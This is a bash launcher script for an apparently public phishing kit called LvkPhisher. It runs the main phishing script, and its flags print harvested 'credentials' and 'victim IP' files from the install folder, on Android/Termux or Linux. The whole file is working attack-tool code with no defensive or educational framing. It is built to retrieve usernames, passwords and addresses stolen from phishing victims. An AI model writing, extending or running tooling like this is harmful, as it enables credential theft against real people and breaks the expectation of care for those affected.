#!/bin/bash

# https://github.com/lvk777/lvkphisher

if [[ $(uname -o) == *'Android'* ]];then
	LVKPHISHER_ROOT="/data/data/com.termux/files/usr/opt/lvkphisher"
else
	export LVKPHISHER_ROOT="/opt/lvkphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run LvkPhisher type \`lvkphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $LVKPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $LVKPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $LVKPHISHER_ROOT
	bash ./lvkphisher.sh
fi
